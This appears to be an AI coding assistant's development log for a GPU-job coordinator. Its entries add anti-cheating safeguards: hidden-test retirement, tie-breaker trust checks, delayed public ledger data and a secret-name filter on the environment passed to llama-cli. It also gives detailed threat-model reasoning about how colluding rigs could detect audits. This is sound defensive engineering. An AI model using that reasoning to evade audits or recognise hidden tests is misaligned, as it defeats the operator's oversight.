- **`python -m app.ledger_copy compare older-copy newer-copy`.** Ledger copies let anyone re-run a signed report, but you make every copy. So one gap was left: share an honest copy for November, then later quietly change November (move points, turn a held result into a confirmed one, delete a failed hidden test) and share a December copy that includes the changed November. Each copy passes its own checks. This tool compares the two and catches it.
- **What it checks**, using the fact that each copy contains everything up to its end date:
  - **Nothing edited or deleted:** every job, result, "this rig may not re-check this job" rule, rig and event in the older copy is still in the newer copy, with the same values.
  - **Nothing back-dated:** the newer copy has no job, rig, result or event dated inside the older period that the older copy didn't have.
  - **Same numbers:** a reward report for everything up to the older end date comes out with the identical fingerprint (`report_sha256`) from both copies.
  - Both copies must also pass their own consistency check.
- **Two things are compared by pattern, not value.** Every copy renames owners (`owner-1`, ...) and scrambles input fingerprints with a fresh random key, so the raw values always differ. The tool checks the *grouping* instead: rigs that shared an owner still do (and no new pairs appear), and jobs that had the same input still do. One honest change is allowed: a rig revoked *after* the older copy's end date shows as active in the older copy.
- **Safe to run by anyone.** It only reads both files (their sha256 stay valid), refuses a full ledger, a junk file or the copies in the wrong order with a plain message, lists the differences if it finds any, and `--out` writes the result as JSON without ever overwriting.
- Tests went from 454 to 467, all passing (13 new). They build two real copies a period apart (with a dispute, a tie-breaker, a failed hidden test and a later revocation), then tamper with the newer one in nine different ways. I switched off 20 of the tool's rules one at a time and a test failed every time (the first run found one rule with no test, "an extra exclusion added later", so I added one). Software only; nothing here touches the GPUs.

**What you learned**
1. **One honest snapshot isn't enough; a chain of them is.** A single copy can't show it wasn't edited before you shared it. Two copies can show the older part wasn't edited *between* them. That's the same idea as an append-only log: new pages are fine, changing old pages isn't.
2. **Compare the pattern when the values are disguised.** Owner names and input fingerprints are deliberately scrambled differently in each copy for privacy. "Who was grouped with whom" survives the scrambling, so that's what gets compared.
3. **Back-dating is its own kind of cheating.** Adding a fake job "from last month" doesn't change any old row, so a plain "did anything change?" check would miss it. You have to also ask "is there anything new in the old period?".
4. **This only works if someone keeps the old copy.** When you pick where reports and copies get posted, keep every old one there rather than replacing it.

## 2026-11-23 (04:15 UTC): Retiring hidden tests once a ledger copy gives them away

**Shipped**
- **The gap.** A shared ledger copy shows which past jobs were hidden tests (outsiders need that to check nobody audited themselves). It hides the prompts, but each rig remembers what it ran. So after a copy, a rig knows "the job that asked X was a test". If the same X were used as a hidden test again, that rig could answer honestly on it and cut corners everywhere else.
- **The fix (`test-reuse-v1`):**
  - `python -m app.ledger_copy export` now writes a note into the live ledger (`ledger_copy_made`, with the copy's end date and sha256). If the note can't be written, the copy is deleted and the export fails, so nothing gets shared without a record. Exporting from a copy is now refused, so the note never changes a file you already shared.
  - `POST /v1/challenges` refuses (`409`, "make a new hidden test") a hidden test whose exact input was a hidden test before the latest copy's end date. Aimed tests are checked too. Normal jobs with the same input are fine; they give nothing away.
  - The operator health page adds `hidden_test_reuse` (how far copies reach, how many test inputs are retired, how many open tests share an input with another test) and warns while open tests share an input, because rigs that compare notes could spot those even without a copy. It never shows the input or the answer.
- Tests went from 467 to 479, all passing (12 new). I switched off 13 of the new rules one at a time; the first round showed 3 with no test (only checking hidden tests, ignoring finished tests in the warning, and skipping a garbled note), so I added tests and then every one was caught. Also ran it on a real coordinator process here: the demo worker answered a hidden SHA-256 test, I exported a copy, the same input was refused with `409`, a new one was accepted, and the input never appeared in the log. Software only; nothing here touches the GPUs.
- **Honest limits:** only the exact input is matched, so a reworded prompt or a changed setting counts as new. Export from the live ledger, not a backup, or the note lands in the backup.

**What you learned**
1. **Sharing has side effects.** Publishing a copy for transparency also teaches the rigs something. Good designs write down what was revealed and react to it.
2. **Fail closed on the record.** If the note "this was shared" can't be saved, it's safer to throw the copy away than to share it and forget.
3. **A test only works if it looks new.** Known-answer tests are expensive to make, so it's tempting to reuse them. Reuse is exactly what lets a cheater recognise them.
4. **Exact matching is a floor, not a ceiling.** The software catches the identical input; writing each test fresh is still the real protection.

## 2026-11-23 (05:05 UTC): Bug check before deploy (0.5.32)

**Checked**
- **Website** (all 4 pages: home, contribute, thanks, 404) at phone (390 px), tablet (768 px) and desktop (1440 px) widths, with the live site's security rules switched on: no sideways scrolling, no JavaScript errors, no broken links or images, no duplicate ids, every image has a text description, every page parses as clean HTML. No website files changed in this session.
- **Worker prototype:** all tests pass: 480 after merging the two commits the other hourly session pushed meanwhile (ledger-copy comparison and retiring revealed hidden tests).

**Fixed**
- The public `/health` page read the new pause setting outside its "is the database OK?" safety net. If that record were ever damaged, the page would crash instead of saying "down". Moved it inside, with a test that damages the record on purpose. (The test fails on the old code and passes on the new.)

**What you learned**
1. **A health check must never crash.** Its whole job is to report trouble, so everything it reads goes inside the same error guard.
2. **Prove the test catches the bug.** Running the new test against the old code first (it failed) shows the test actually checks the fix.

## 2026-11-23 (05:15 UTC): A private stock of hidden tests (0.5.33)

**Shipped**
- **The gap.** Aimed hidden tests (0.5.21) are the best way to check a brand-new or just-caught rig, but each one had to be typed into an HTTP request by hand, and since 0.5.31 each one must also be fresh. In practice that means they'd rarely happen.
- **`python -m app.challenge_pool`** keeps prepared tests (an input plus its known answer) in one private file and sends them to the coordinator a few at a time:
  - `init` makes the file readable by you only, and refuses to create it inside a git folder, so the answers can't be committed by accident. Every other command refuses the file if someone else can read it.
  - `add --file tests.jsonl` checks each test the same way the coordinator will (task type, size, payload, and "does the answer pass the task's own check?") and skips anything already in the pool or used before. `make-demo` adds SHA-256 practice tests.
  - `status` shows counts only, and warns when you're running low.
  - `issue --count 3 --tier new` (or `--worker rig-c`) picks tests at random and queues them as hidden tests. It never sends points, so the points table decides them like for normal work and a test can't be spotted that way.
- **Each test is used once, even when things go wrong.** A test is crossed off and saved *before* it's sent. If the connection drops or the program crashes, it stays crossed off (marked `unknown` or `sending`) rather than risk sending it twice. It only goes back into the pool when the coordinator clearly refused it and created nothing (wrong token, unknown or revoked rig, paused, refused test). A test refused because a ledger copy already revealed it is retired. It stops at the first problem instead of burning through the pool.
- **Nothing it prints contains an input or an answer**, and the coordinator logs these like any normal job.
- Tests went from 480 to 509, all passing (29 new). I switched off 16 of the tool's rules one at a time and a test failed every time. Also ran it against a real coordinator process here: 2 practice tests aimed at new rigs were queued, an unknown rig and a paused coordinator were refused with the tests put back, and no test input showed up in the log. Software only; nothing here touches the GPUs.
- **Honest limits:** the tool doesn't write good tests. For AI jobs, the known answer has to come from running the pinned model yourself on the rig (Phase 3), so the real pool is still empty.

**What you learned**
1. **A defense you have to do by hand mostly doesn't happen.** Turning "write a test, send it" into "keep a stock, send three" is what makes regular spot checks realistic.
2. **When unsure, assume it was sent.** If the network fails mid-send, you can't know whether the test arrived. Treating it as used costs one test; treating it as unused could send the same test twice, which is exactly what makes tests recognisable.
3. **Save before you act.** Writing "used" to disk before sending means even a power cut can't undo the cross-off.
4. **Secrets need a home outside the repo.** The answers to hidden tests are as sensitive as a password: the tool refuses to keep them anywhere git could pick them up.

## 2026-11-23 (06:15 UTC): A trust check before a tie-breaker settles an argument (0.5.34)

**Shipped**
- **The gap (threat model #6).** When a re-check disagrees with a rig's answer, a third rig (the tie-breaker) runs the same job and two-out-of-three wins. The loser gets a strike. But if the tie-breaker and the rig it sides with belong to the same person, two cheaters can outvote one honest rig, and the honest rig gets the strike.
- **New optional setting `TIEBREAK_DECIDES=established-only`** (rule `tiebreak-trust-v1`). A two-out-of-three vote only settles the argument on its own when *both* rigs on the winning side already have a proven record (`established`: enough results that passed independent checks, no strikes). Their records are read from *before* the vote, so the vote can't vouch for itself.
- **Otherwise the case waits for you.** All three answers stay held, nobody gets a strike, and `python -m app.review` lists it as "needs a person", showing who agreed with whom. A private note in the audit trail records which side the tie-breaker took and each rig's tier. Rigs can't see any of this: their points show as "held" either way, and shared ledger copies drop the note.
- **Off by default (`always`, today's behaviour).** While every rig is new, every argument would wait for you, and held points stay held until scoring v2 says what your verdict does. That trade-off is your call (added to USER_TODO).
- Tests went from 509 to 520, all passing (11 new). I switched off 10 of the new rules one at a time (ignore the winner's record, ignore the tie-breaker's record, leak the note to rigs, skip the review-queue label, and so on) and a test failed every time. Software only; nothing here touches the GPUs.
- **Honest limits:** it doesn't help against a ring whose rigs have already earned `established` by behaving well first. It only decides *whether* a vote counts automatically, not what happens to the points afterwards.

**What you learned**
1. **A majority vote is only as good as the voters' independence.** Two-out-of-three sounds fair, but if two of the three are secretly one person, it's one-against-one with a thumb on the scale.
2. **Don't let a decision count toward the voter's own reputation.** The tie-breaker earns a "passed check" from the very vote in question, so trust is read from before the vote.
3. **"Hold and ask a person" is a valid answer.** When the software can't tell honest from collusion, freezing the points and flagging the case is safer than guessing, as long as someone actually looks.
4. **Safety settings have a cost.** Stricter rules mean more manual work early on, which is why this ships switched off and you decide when to turn it on.

## 2026-11-23 (07:25 UTC): Safer llama-cli runs on the worker (0.5.35)

**Shipped**
- **The gap.** Everything around an AI job was hardened except the moment the worker actually starts llama-cli. Four problems there:
  1. The prompt went on llama-cli's command line. Any user on the rig can read another program's command line with `ps`, and a hidden test's prompt is exactly what a cheater wants to see.
  2. llama-cli got the worker's whole environment. The worker loads `.env`, and on your machine that file can hold `OPERATOR_TOKEN`, `SUBMITTER_TOKEN` or an enrollment code. A third-party program should never see those.
  3. Nothing said which card to use, so two workers (one per card) could both land on card 0.
  4. If llama-cli failed or ran out of time, the worker crashed instead of moving on.
- **The fix (`llm-run-v1`, new `app/llm_runner.py`):**
  - The prompt is written to a private file (folder only you can open, file `0600`) and llama-cli reads it with `-f`. The file is deleted after the run. As a bonus, a prompt with an invisible NUL character, which used to crash the worker, now works.
  - llama-cli gets a short allow-list: PATH, HOME, language and temp settings, and GPU driver settings (`VK_ICD_FILENAMES`, `MESA_*`, `RADV_*`, `GGML_VK_*`). Anything with TOKEN, SECRET, KEY, CODE and similar in its name is dropped even from that list.
  - New worker settings: `LLM_VK_DEVICE=1` pins that worker to card 1; `LLM_GPU_LAYERS` (default 99 = whole model on the GPU, 0 = CPU only); `LLM_THREADS`. A typo stops the worker offering AI jobs rather than running on the wrong card.
  - Every run uses the same context size (2048) so VRAM use is predictable on the 4 GB card; input is closed so it can't hang waiting for typing; output over 64 KiB stops the run; a timeout stops llama-cli *and anything it started*.
  - The worker now prints `Could not run job <id>: <reason>` and carries on. The reason never contains the prompt. The job goes back to the queue when its lease runs out.
- Tests went from 520 to 546, all passing (26 new), all with a **fake** llama-cli script that records what it was given. I switched off 20 of the new rules one at a time; the first round showed 2 gaps (a test couldn't tell whether input was really closed, because pytest's own input was already empty, and one line of timeout clean-up duplicated another). I fixed the test to feed real typed input and removed the duplicate line; after that, every rule was caught.
- **Honest limits:** no model has run here and nothing touched a GPU. The flag names match llama.cpp's `llama-cli`; newer llama.cpp builds may move plain text completion to a separate `llama-completion` program with the same flags. Phase 3 on the rig has to confirm which build works on the RX 470s and that `GGML_VK_VISIBLE_DEVICES` really keeps each worker on its card (the `gpu_run` recorder shows which card was busy).

**What you learned**
1. **The command line is public on a shared machine.** Passwords and secret inputs go in files only you can read, or through a pipe, never as arguments.
2. **Give a program only what it needs (least privilege).** Copying your whole environment into a helper program hands it every token you loaded, whether it needs them or not. An allow-list ("only these") is safer than a block-list ("everything except these").
3. **A worker should survive one bad job.** Crashing on one timeout takes the whole rig offline; skipping the job and letting the lease run out keeps it earning and lets someone else try.
4. **Kill the whole family.** A program can start helpers. Starting it in its own process group means a timeout stops all of them, not just the parent.

## 2026-11-23 (08:15 UTC): An optional penalty for caught cheaters (0.5.36)

**Shipped**
- **The gap (threat model #15).** Only some results get re-checked. Under the current scoring (`sim-points-v1`) a rig that fakes answers loses points only on the fakes that happened to be checked, and keeps them for every fake nobody looked at. So as long as the check rate is below 100%, faking still pays on average.
- **New optional scoring rule `sim-points-v2-forfeit`.** If a rig gets a strike in a period (it failed a hidden test, or a tie-breaker outvoted it), it loses its *unchecked* (`unverified`) points for that whole period. Points for work that passed an independent check (`confirmed`) are kept. Cases where the software couldn't tell who was right (`disputed`, `unresolved`, or a tie-breaker held for you) cost nothing, because nobody was proven wrong.
- **How to switch it on:** `REWARD_SCORING=sim-points-v2-forfeit` in `prototype/.env`, or try it on one report with `python -m app.rewards report --scoring sim-points-v2-forfeit`. **It's off by default**; picking a penalty is your decision (already on your to-do list, now with the trade-off spelled out).
- **What the report shows:** each rig gets `struck` (yes/no) and `forfeited_points`; totals get `forfeited_points`. It never says *which* result caused the strike or whether it was a hidden test. The rule's name is inside the signed part and the hash, so `verify` rebuilds the report with the same rule, including from a shared ledger copy. Old v1 reports are byte-for-byte unchanged, so every report already signed still verifies.
- **Safety nets:** a typo in `REWARD_SCORING` stops the coordinator at start instead of mid-report; operator health shows which rule is active.
- Tests went from 546 to 559, all passing (13 new). I broke the new code on purpose 12 ways (no forfeit, ignoring failed hidden tests, treating every held case as a strike, forfeiting confirmed points too, totals not reduced, CLI ignoring the setting, API ignoring it, no start-up check, and more) and a test failed every time. Software only; nothing here touches the GPUs, and points are simulated.
- **Honest limits:** the penalty only reaches the period of the strike, so a cheater caught early in the next period keeps the previous period's unchecked points. A rig can tell that one of its held results counted as a strike. And until the RX 470s show how often honest cards disagree (Phase 3), an honest rig could be struck over a GPU quirk, which is the main reason it ships switched off.

**What you learned**
1. **Spot checks need a cost for getting caught.** If a check only takes away the one fake it found, cheating is a bet with no downside. Making one caught fake cost all the unchecked work in that period turns it into a bad bet.
2. **Punish what was proven, not what's merely in doubt.** A dispute with no clear winner isn't proof anyone cheated, so it costs nothing; only a failed known-answer test or losing a 2-against-1 vote counts.
3. **Version your rules so old results stay checkable.** Because each report names its scoring rule inside the signature, last month's v1 reports still verify after v2 exists.
4. **Fail loudly at start-up.** A misspelled setting that silently falls back to the old rule is worse than a coordinator that refuses to start and tells you why.

## 2026-11-23 (09:20 UTC): Busy rigs are no longer counted as dodging audits (0.5.37)

**Shipped**
- **The bug.** When a rig is picked to re-check someone's work (an audit), it gets 2 minutes (`AUDIT_ASSIGN_SECONDS`) to pick it up, or the coordinator writes it down as a "drop" and hands the audit to someone else. But jobs go out oldest first. If the rig was busy with jobs that were queued *before* the audit, it kept getting those older jobs and the 2 minutes ran out before it ever reached the audit. It never saw the audit and had no say in it, yet it was counted as dropping it, and after 3 of those the operator health page warned about it as if it might be dodging checks. On a busy queue that would have flagged every honest rig.
- **The fix (`follow-through-v2`).** The trust report's `audit_follow_through` now has a new count, `not_reached`: the pick's window ran out *while it was taking other jobs*. That is not a drop and doesn't count toward the warning. `not_claimed` (which does count) now means the rig went silent: it took no job at all in that window.
- **Only the window counts.** Work a rig took *before* it was picked doesn't excuse going silent afterwards (tested). And because every job hand-out runs the "has the window run out?" check first, a rig that comes back late can't make an old silence look busy.
- **What didn't change:** which job a rig gets, points, audit rates. I deliberately did *not* make audits jump the queue: a rig can see roughly when a job was created, so a brand-new job arriving while older ones wait would be a hint that it's a check.
- Tests went from 559 to 562, all passing (3 new; 2 older tests updated for the new field). The first new test failed before the fix with exactly the bug (`not_claimed: 1, dropped: 1` for a rig that was working the whole time). I then broke the fix 4 ways (forget the start of the window, forget the end, never count busy, drop the new field) and a test failed every time. Software only; nothing here touches the GPUs.
- **Honest limits:** it's still a lifetime count and still a warning only. A rig that went offline mid-job in its window counts as busy for that one pick. What repeated drops should *do* is still your call (on your to-do list).

**What you learned**
1. **A rule can blame the wrong person when the system, not the user, caused the miss.** The rig didn't skip the audit; the queue order kept it out of reach. Before flagging someone, check whether they could have done otherwise.
2. **Write the failing test first.** Reproducing the bug as a test before touching the code proves the bug was real and that the fix is what made it go away.
3. **The obvious fix can create a new leak.** "Just give audits priority" would have fixed the count, but it would also tell a rig "this fresh job skipped the queue, so it's probably a check." Fixing the measurement instead of the behaviour avoided that.
4. **Order of events is evidence.** Because every hand-out checks the clock first, the order of entries in the audit trail is enough to tell "busy" from "silent" without trusting anyone's timestamps.

## 2026-11-23 (10:17 UTC): The public ledger no longer gives away hidden tests (0.5.38)

**Shipped**
- **The leak (threat model #14).** Anyone can read `GET /v1/ledger`, which shows how many simulated points sit in each bucket: confirmed, pending, unverified, held. A normal AI job lands in *pending* (waiting for a re-check) or *unverified* (not picked for one). But a hidden known-answer test is marked the moment it arrives: *confirmed* if the answer was right, *held* if it was wrong. So a rig could read the totals, submit, read them again, and know straight away "that was a test, and I got caught" (or "that was a test, and I passed"). The individual rows had a second hint: when a re-check agreed, both results flipped to `replicated` within minutes, telling the auditor its job had been a re-check of someone else's.
- **The fix (`public-delay-v1`).** For `PUBLIC_SETTLE_DELAY_SECONDS` after a result is accepted (default 3600 = one hour), the public view counts it as *pending* and shows its confidence as hidden (`null`, `settlement_visible: false`), **whatever kind of job it was**. Everything looks the same while it's fresh. After the hour, the real bucket shows, and by then normal work has usually been re-checked too, so the timing gives nothing away.
- **You still see it live:** the same endpoint with your operator token answers `view: operator-live` with no delay. A wrong token is refused and counts toward the lock-out, like every other operator endpoint.
- **What didn't change:** points, audits, reward reports, ledger copies, the total points figure and job counts. Setting `0` brings back the old live view, and operator health then warns you about it.
- Tests went from 562 to 573, all passing (11 new). The main new test ran three ways (normal job, passed hidden test, failed hidden test) and fails with the old live bucket logic in exactly the two hidden-test cases and passes for normal work, which proves the leak was real. Nine existing tests read buckets straight away on purpose, so their setup now says `public_settle_delay_seconds=0` with a pointer to the new tests. I then broke the fix 9 ways (no delay on the totals, confidence still shown, off-by-one at the hour mark both ways, operator view delayed, operator view without a token check, no warning at 0, default 0, setting not read) and a test failed every time.
- **Honest limits:** the public job counts (`jobs.queued`) are still live, so a ring member watching the queue right after a submit can see whether a re-check was queued, and over many jobs roughly guess how often a rig is checked. That's a weaker hint and the counts are useful for monitoring, so I wrote it into the threat model instead of hiding them. If a re-check takes longer than the delay, a hidden test can still look "settled early". Software only; nothing here touches the GPUs.

**What you learned**
1. **Timing is information.** Hiding *what* a job is doesn't help if *when* its result settles is different. Two things that look identical on paper can still be told apart by a stopwatch.
2. **Make everything look the same for a while.** Instead of trying to fake a believable "pending" for each hidden test, the fix treats every fresh result the same way. Uniform is much easier to get right than convincing.
3. **Public and private views of the same data.** The operator needs the live truth to run things; the public only needs it eventually. One endpoint, two views, and the stronger one sits behind the token.
4. **When a change makes old tests fail, read why before "fixing" them.** Those nine tests were checking how settling works, not what the public sees, so the right move was to say so in their setup, not to weaken the new rule.

## 2026-11-23 (11:20 UTC): Near copies of a revealed hidden test are refused too (0.5.39)

**Shipped**
- **The gap (threat model #11).** Once a ledger copy is shared, every rig can see which of its past jobs were hidden tests. Since 0.5.31 the coordinator refuses to reuse such a test's input as a new hidden test (`test-reuse-v1`), but it compared inputs byte for byte. For AI jobs the input also holds the seed, `max_tokens`, timeout and model, so the *same question* with seed 8 instead of 7 counted as new. So did `name a ship?` after `Name a ship`. A rig that remembers the question would recognise both, and answer honestly only on those.
- **The fix (`test-reuse-v2`).** Inputs are now compared by a fingerprint (`input-fingerprint-v1`): the task type plus the part a rig would remember (for AI jobs the prompt only), with letter case, spaces, punctuation, symbols, invisible characters (like a zero-width space) and full-width look-alike letters ignored. A new hidden test that is a near copy of a revealed one gets `409`. The message says "exact" or "differs only in case, spacing, punctuation or settings", never which old test it matched.
- **Same rule everywhere:** operator health counts near copies as one input (both the "retired" count and the warning about open tests sharing an input), and the private test pool (`challenge_pool add`) now skips near copies of tests it already holds or used. Used tests record their fingerprint; older pool files still load and still block their exact input. Normal jobs are never refused.
- Tests went from 573 to 596, all passing (23 new; one older test updated for the new rule name). I broke the change 12 ways; 11 were caught straight away. The one that wasn't (dropping a "same task type" check) turned out to be a check the fingerprint already does, so I removed the duplicate line instead of adding a test for dead code. I also ran it against a real coordinator process here: a hidden SHA-256 test answered by the demo worker, a ledger copy exported, then the exact input refused, `secret boat-riddle!` refused as a near copy of `Secret Boat Riddle`, a fresh test accepted, and the riddle never in the server log. Software only; nothing here touches the GPUs.
- **Honest limits:** rewording (`Give me a ship's name`), translation and look-alike letters from another alphabet still count as new. The rule is deliberately broad, so two questions that differ only in a symbol (`7*8` vs `7+8`) count as the same and the second is refused; the fix for you is simply to write a different question.

**What you learned**
1. **"Same" needs a definition.** Computers compare exact bytes; people (and cheating rigs) recognise meaning. Deciding what counts as "the same question" is a design choice, and writing it down as a named rule (`input-fingerprint-v1`) means it can be changed later without confusion.
2. **Normalise, then compare.** Folding away case, spacing and punctuation before hashing turns many different-looking inputs into one, the same trick search engines use so "Boat" and "boat!" find the same pages.
3. **Choose which mistake to make.** A broad rule sometimes refuses a test that was actually new (cost: you write another question). A narrow rule lets a recognisable test through (cost: a cheating rig knows when to behave). The cheap mistake is the better one here.
4. **When a broken version still passes, look before adding a test.** Sometimes the missing test reveals a real gap; sometimes, like here, it reveals a line of code that does nothing, and deleting it is the better fix.

## 2026-11-23 (12:20 UTC): The public ledger no longer pairs a re-check with its original (0.5.40)

**Shipped**
- **The leak (threat model #14, follow-up).** Every row of the public `GET /v1/ledger` showed `result_hash`: the sha256 of the answer the rig sent. A re-check runs the same job again on another rig, so when it agrees, its answer, and therefore its hash, is *identical* to the original's. Anyone reading the ledger could line the two rows up, immediately and forever. That gave away three things: (1) a rig could count how often its own work gets re-checked, and so roughly work out its trust tier; (2) the auditor could find its own hash on another rig's earlier row and know its job had been a re-check, which is exactly what last session's change (hiding `confidence` for an hour) was meant to hide; (3) a passed hidden test showed the hash of the operator's expected answer.
- **The fix (`public-no-hashes-v1`).** Public ledger rows no longer include `result_hash`. Everything else stays (job, rig, points, time, and after the delay how it was checked), so a rig can still find its own row. The response now says which rules shaped it (`public_rules`) and what was left out (`hidden_fields`). The operator view (with the operator token) still shows every hash. Setting `PUBLIC_SETTLE_DELAY_SECONDS=0` brings back the live points view but not the hashes, because pairing needs no timing at all. Ledger copies and reward reports never had the hashes, so nothing changes there.
- **Proof.** I wrote the tests first and watched all 6 fail on the old code, then made the fix. They check that the answer's hash appears nowhere a stranger can read (`/v1/ledger`, `/health`, `/v1/jobs/{id}` for both the original and the re-check), before and after the delay, and that the operator still sees both hashes match. I then broke the fix 3 ways (hashes always shown, the removal line skipped, the operator's hashes removed too); the tests caught each one. Tests went from 596 to 602, all passing; the two-worker rehearsal still passes 28/28; and a real uvicorn coordinator here answers with the new fields. Software only; nothing here touches the GPUs.
- **Still open, written down.** The public job counts are live, so right after a rig submits, `queued` going up by one hints that a re-check was just scheduled. I looked at simply leaving re-checks out of the counts and it doesn't work: the auditor would then see the counts *not* move when it claimed its job, which tells it the job was a re-check. The real fix is to delay or batch the counts for everyone; that's noted in the threat model rather than rushed.

**What you learned**
1. **A hash is a fingerprint, not a lock.** Hashing an answer hides the words, but two identical answers still have identical fingerprints, so a hash shows *which things match* to anyone looking.
2. **Leaks come in pairs.** Last session hid one clue (the "replicated" label); this session found a second clue (matching hashes) that gave away the same secret. When you hide something, look for every other field that says the same thing.
3. **Write the failing test first.** Watching the 6 tests fail on the old code proves the leak was real and that the tests can see it; only then does "now they pass" mean something.
4. **Moving a leak isn't fixing it.** Hiding re-checks from the job counts would have just moved the tell from one rig to another. Sometimes the honest answer is "not yet, and here's why".

## 2026-11-23 (13:25 UTC): Public job counts no longer show that a re-check was just queued (0.5.41)

**Shipped**
- **The leak (threat model #14, the last hint left open).** Anyone can read `/health` and `GET /v1/ledger`, and both showed *live* job counts: how many jobs are queued, leased, accepted and so on. When a rig's AI result is picked for a re-check, the coordinator queues that re-check the instant the result is accepted. So `queued` went up by one right after that rig's submit, and didn't after the others. A rig reading the counts just before and after each submit could learn which of its results were being re-checked, and from that roughly how often it is checked (its trust tier).
- **The fix (`public-counts-v1`).** The public counts are now taken once per clock-aligned window of `PUBLIC_COUNTS_INTERVAL_SECONDS` (default 900 = 15 minutes, windows start at :00, :15, :30, :45) and the same numbers are repeated until the next window starts, for everyone and every kind of job. A rig sees at most one change per window, the sum of everything that happened in it. Both public views share one snapshot, and the responses say when it was taken (`jobs_counted_at`) and when the next one is due (`jobs_next_count_at`). With your operator token, `GET /v1/ledger` still shows live counts; operator health is live as before.
- **Why not just hide re-checks from the counts?** Last session showed it moves the tell to the other side: the auditor would see the counts *not* change when it claimed its job. Batching treats every job the same, so neither side can tell. A test checks the auditor's side too.
- **Knock-on fix:** the two-worker rehearsal refuses to run on a coordinator with queued work. It read that from the public counts, which could now be up to 15 minutes old, so it reads your live operator counts instead (new test: a job queued after the public snapshot is still caught).
- **Proof.** I wrote the tests first: on the old code the main test showed exactly the leak (`queued: 1` after a re-checked submit, nothing after an unchecked one). Tests went from 602 to 615, all passing (13 new; 2 older tests reworded, not weakened). I broke the fix 9 ways (counts always live, off-by-one window, window restarting from the last request, operator view batched, `/health` live, no warning at 0, rule missing from the response, wrong "next count" time, rehearsal reading public counts); a test failed every time. The rehearsal still passes 28/28, and a real uvicorn coordinator here showed `{}` publicly and `{'queued': 1}` to the operator right after a job was queued.
- **Honest limits:** on a quiet coordinator (one or two rigs, few jobs), a 15-minute window may contain only one rig's activity, so the batched counts can still hint. A longer window or more rigs makes it weaker. The snapshot lives in the coordinator process, so run one process (as the prototype does). `0` brings back live counts and operator health warns. Software only; nothing here touches the GPUs.

**What you learned**
1. **Batching is a privacy tool.** Showing totals every 15 minutes instead of every second blurs one person's action into everyone's, the same idea as a bank statement listing a day's total instead of each tap of your card.
2. **Tie the clock, not the caller.** The windows start at fixed times, so nobody can restart one by asking at a clever moment. If the snapshot refreshed "15 minutes after the last request", a rig could control when it happens.
3. **When you change one thing, look for who relied on it.** The rehearsal's safety check quietly depended on live counts; batching them would have made it miss real queued work. Searching for every reader of a field before changing it found that.
4. **Name what's left.** The fix makes the hint weaker, not impossible, on a tiny network. Writing that down keeps the docs honest and tells you what would help (more rigs, longer window).

## 2026-11-23 (14:20 UTC): A public logbook for signed reports, on the site and on GitHub (0.5.42)

**Your decision:** signed points reports and ledger copies get posted on a page on the site *and* on GitHub. Both are the same thing: a new `reports/` folder in the repo. GitHub keeps its full history, and Netlify serves it at **boatsnhoes.meme/reports/** once this is merged.

**Shipped**
- **The page (`/reports/`).** Same orange/black style as /contribute. It lists every published period with its dates, rigs, results, simulated points, the download links and the report's fingerprint (`sha256`), shows the coordinator's signing key, and gives copy-paste commands to check it all. The FAQ explains the 7-day wait, what's removed from the copies, why it's on both the site and GitHub, and what checking does and doesn't prove. Today it honestly says "No periods published." The list is built from `reports/index.json` with `textContent` only, so nothing in that file can run as code. /contribute's footer links to it; your homepage is untouched.
- **The GitHub side.** `reports/README.md` explains the folder to anyone browsing GitHub: the layout (one folder per period with `report.json`, `ledger-copy.sqlite3`, `SHA256SUMS`), how to check it, and how you publish.
- **The publishing tool (`python -m app.publish_report add`).** It refuses unless the report is signed by the key you give and unedited, the database file is a redacted copy (it will never post the live ledger, which holds keys, prompts and answers), the copy ends where the period ends and re-creates the identical report, the period ended at least 7 days ago, it doesn't overlap a posted period, and the earlier history is unchanged (`ledger_copy compare` against the last copy). It copies the files byte for byte, the folder appears in one step, and nothing already posted is ever replaced. `--dry-run` runs every check and writes nothing. It doesn't touch git: you commit, open a pull request, merge.
- **Anyone can re-check everything (`python -m app.publish_report check`).** Hashes, checksum files, signatures, each report against its copy, each copy against the one before, and no stray folders. CI now runs it on every change to `reports/`, and a test runs it on the real folder.
- **Proof.** 626 tests, all passing (11 new). I broke the tool 11 ways. 9 were caught straight away. One miss showed the overlap test only tried a period going backwards, so I added a real overlap case (a period starting 10 seconds before the last one ended); now caught. The other miss was the "report is not signed" check, which turned out to be covered by the signature check anyway; it stays only because its error message tells you how to fix it. I also published two made-up periods into a throwaway copy of the site and viewed the page at phone width (390 px) and desktop (1440 px): both periods listed, the key shown, no sideways scrolling, no script errors.
- **Honest limits:** nothing is published yet, because there are no real periods until the rigs run real jobs. Rig names appear in public files, so name rigs something that doesn't identify people. The 7-day wait is my default, so change it if you like. I couldn't run the full W3C HTML validator here (that tool was blocked); I checked the page structure with a parser instead (no unclosed tags, no duplicate ids).

**What you learned**
1. **One folder, two front doors.** Netlify publishes the repo as-is, so a folder in GitHub *is* a page on the site. No syncing, no second copy to drift.
2. **Make the tool refuse the dangerous mistake.** The worst thing that could happen is posting the live database. The tool checks for the "this is a redacted copy" label and won't publish anything without it.
3. **Never replace, only add.** Proving "we didn't rewrite history" only works if every old copy stays up. So the tool can add a period but has no way to overwrite one.
4. **Let the robot re-check.** CI runs the same check anyone else can run, so a broken or edited file fails the build before it reaches the site.

## 2026-11-23 (14:30 UTC): Who agreed with a rig that got caught? (0.5.43)

**Housekeeping first:** PR #4 was merged into main at 14:07 (squashed), and another session pushed the public logbook (0.5.42) to the drafts branch while this one was working. I merged both in; the only clashes were in the version line, changelog and this log, so this entry is 0.5.43.

**Shipped**
- **The gap (threat model #3).** Re-checks catch a rig that fakes an AI answer, unless the rig that re-checks it is a friend. Then both answers match, both are marked *confirmed*, and nothing looks wrong. Random auditor picks (0.5.8) make that rarer, but when it happens the software can't see it.
- **What can be seen later.** Sooner or later the cheater gets caught: it fails a hidden known-answer test or is outvoted in a tie-breaker (a "strike"). From that moment, every rig whose answer *agreed* with it earlier deserves a second look.
- **The vouch check (`vouch-check-v1`).** `GET /v1/operator/vouches` (operator token) or `python -m app.vouches` (opens the database read-only) lists:
  - **caught rigs**, with their strikes;
  - **leads**: every rig that agreed with a caught rig, how many times and with whom, and how many hidden tests it has passed itself. Two caught rigs that agreed with each other come first;
  - **weak confirmations**: confirmed results whose *only* independent agreement came from a caught rig, with their simulated points.
- **Operator health** now has a `vouches` summary and warns about leads that aren't revoked, aren't already caught, and have never passed a hidden test, with the next step: aim a hidden test at each (`target_worker`, or `challenge_pool issue ... --worker <id>`). An honest rig passes and loses nothing; a colluder has to answer honestly or earn its own strike.
